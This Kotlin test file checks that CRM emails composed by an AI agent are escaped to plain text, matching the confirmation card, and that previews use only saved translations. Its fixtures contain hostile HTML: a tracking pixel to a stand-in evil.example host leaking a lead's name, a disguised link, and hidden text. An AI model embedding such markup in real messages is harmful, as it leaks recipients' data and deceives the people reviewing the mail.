package com.ideasdeveloper.bms.modules.crm

import com.ideasdeveloper.bms.server.activity.ActivityLogTesting
import com.ideasdeveloper.bms.server.modules.SmtpSettings
import java.math.BigDecimal
import java.sql.Connection
import java.util.UUID
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertContains
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * What an agent or the in-app assistant sends is what its confirmation card shows: its text goes out as plain text (never as
 * HTML) and a template is translated only from translations already saved, never by a request made while showing the card.
 */
class CrmAgentMessageTest {
    private val hidden = """<p>Hola</p><img src="https://evil.example/p.gif?lead=luis"> <a href="https://evil.example/x">ver factura</a><span style="display:none">oculto</span>"""

    @Test
    fun theTextOfAnAgentIsEscapedAndTheCardShowsExactlyIt() {
        val plain = CrmMail.render("Asunto", hidden, mapOf("nombre" to "Luis"), plain = true)
        assertFalse(plain.html.contains("<img"), plain.html)
        assertFalse(plain.html.contains("<a href"), plain.html)
        assertFalse(plain.html.contains("<span"), plain.html)
        assertContains(plain.html, "&lt;img src=&quot;https://evil.example/p.gif?lead=luis&quot;&gt;")
        // The card shows the plain text and that is what the recipient reads: every tag is visible in it.
        assertContains(plain.text, """<img src="https://evil.example/p.gif?lead=luis">""")
        assertContains(plain.text, """<a href="https://evil.example/x">""")
        assertContains(plain.text, """<span style="display:none">oculto</span>""")
        // Placeholders still fill (escaped), as in any message.
        assertEquals("Hola Luis <3", CrmMail.render("Asunto", "Hola {nombre}", mapOf("nombre" to "Luis <3"), plain = true).text.replace("&lt;", "<"))
        // The same text without the rule is sent as HTML (what a company template or the reply form may still do).
        assertTrue(CrmMail.render("Asunto", hidden, emptyMap()).html.contains("<img src="))
    }

    private val map = mapOf("Español" to "es", "Inglés" to "en")
    private val settings = CrmTranslationSettings("anthropic", "key", "", "idioma", map)
    private val template = CrmTemplate(UUID.randomUUID(), "Bienvenida", "Hola {nombre}", "<p>Hola {nombre}</p>", "es", true)
    private val values = mapOf("nombre" to "Luis")

    private class FailingTranslator : CrmTranslator {
        var calls = 0
        override fun translate(subject: String, body: String, isHtml: Boolean, source: String, target: String): Pair<String, String> {
            calls++
            throw AssertionError("a preview must not call the translation service")
        }
    }

    private class MemoryCache(val hit: Pair<String, String>?) : CrmTranslationCache {
        override fun get(language: String, hash: String) = hit
        override fun put(language: String, hash: String, subject: String, body: String) = throw AssertionError("nothing is saved by a preview")
    }

    @Test
    fun withoutRemoteNoTranslatorIsCalledAndTheBaseLanguageGoesOutWithANote() {
        CrmTranslate.markWorking(settings)
        val translator = FailingTranslator()
        val mail = CrmTemplateMailer.compose(template, values, "Inglés", settings, translator, MemoryCache(null), remote = false)
        assertEquals(0, translator.calls)
        assertFalse(mail.translated)
        assertEquals("es", mail.language)
        assertContains(mail.note.orEmpty(), "Sin traduccion guardada")
        assertContains(mail.text, "Hola Luis")
        // Not even a translator that failed before is touched or marked: the memory of failures stays as it was.
        assertFalse(CrmTranslate.coolingDown(settings))
    }

    @Test
    fun withoutRemoteASavedTranslationIsUsedExactly() {
        val translator = FailingTranslator()
        val mail = CrmTemplateMailer.compose(template, values, "Inglés", settings, translator, MemoryCache("Hello {nombre}" to "<p>Hello {nombre}</p>"), remote = false)
        assertEquals(0, translator.calls)
        assertTrue(mail.translated)
        assertEquals("en", mail.language)
        assertNull(mail.note)
        assertEquals("Hello Luis", mail.subject)
        assertContains(mail.text, "Hello Luis")
    }

    @Test
    fun theDefaultStillTranslatesOnDemandForTheScreens() {
        CrmTranslate.markWorking(settings)
        var calls = 0
        val translator = object : CrmTranslator {
            override fun translate(subject: String, body: String, isHtml: Boolean, source: String, target: String): Pair<String, String> {
                calls++
                return subject.replace("Hola", "Hello") to body.replace("Hola", "Hello")
            }
        }
        val mail = CrmTemplateMailer.compose(template, values, "Inglés", settings, translator, null)
        assertEquals(1, calls)
        assertTrue(mail.translated)
        assertEquals("Hello Luis", mail.subject)
    }
}

/** The reply composed for an agent, on a real PostgreSQL (BMS_CRM_ACTIVITY_PG_URL ...): the preview and the send are one function. */
class CrmAgentMessagePostgresTest {
    private val url: String? = CrmTestDatabase.url
    private var tenant: Connection? = null
    private val person = ActivityLogTesting.user("Ana Ruiz")

    @AfterTest
    fun close() {
        tenant?.close()
        tenant = null
    }

    @Test
    fun theReplyOfAnAgentIsPlainTextAndTheSameEveryTimeItIsComposed() {
        if (url == null) return
        val db = CrmTestDatabase.open("bms_crm_msg", person.userId!!, "Ana Ruiz")!!.also { tenant = it }
        val stages = CrmRepository.stages(db)
        val open = stages.first { it.kind == StageKind.Open }
        val input = CrmLeadInput(
            name = "Luis Mora", email = "luis@example.com", phone = "", stageId = open.id, interestId = null, ownerUserIds = emptyList(), source = "Web", language = "es",
            message = "", details = "", targetStart = null, targetEnd = null, estimatedValue = BigDecimal.ZERO, followUpOn = null,
        )
        val leadId = CrmRepository.createLead(db, input, open, CrmActor(person.userId, "Ana Ruiz", person))
        val lead = CrmRepository.lead(db, leadId)!!
        val scope = CrmScope(person.userId, seesAll = true, reception = true, interestsEnabled = false, interests = emptySet())
        val permissions = ActivityLogTesting.permissions(granted = setOf(CrmScreens.View, CrmScreens.Manage), actor = person)
        val smtp = SmtpSettings("smtp.example.com", 587, "u", "p", "acme@example.com", trusted = true)
        val context = CrmScreens.Context(db, permissions, scope, stages, emptyList(), emptyList(), serverMail = smtp)
        val typed = mapOf("channel" to "Correo", "template" to "", "subject" to "Hola {nombre}", "text" to """Hola {nombre} <img src="https://evil.example/p.gif"> <b>ya</b>""")

        val (_, shown) = CrmAdminScreens.composeReply(context, lead, typed, fromAgent = true)
        val (_, sent) = CrmAdminScreens.composeReply(context, lead, typed, fromAgent = true)
        // The preview and the send compose the same email, and nothing in it is HTML but the frame of the layout.
        assertEquals(shown, sent)
        assertEquals("Hola Luis Mora", sent.subject)
        assertFalse(sent.html.contains("<img") || sent.html.contains("<b>"), sent.html)
        assertContains(sent.text, """Hola Luis Mora <img src="https://evil.example/p.gif"> <b>ya</b>""")
        // The reply form of the app (a person typing) is unchanged: it still sends the HTML it was given.
        val (_, form) = CrmAdminScreens.composeReply(context, lead, typed)
        assertTrue(form.html.contains("<b>ya</b>"))
    }
}
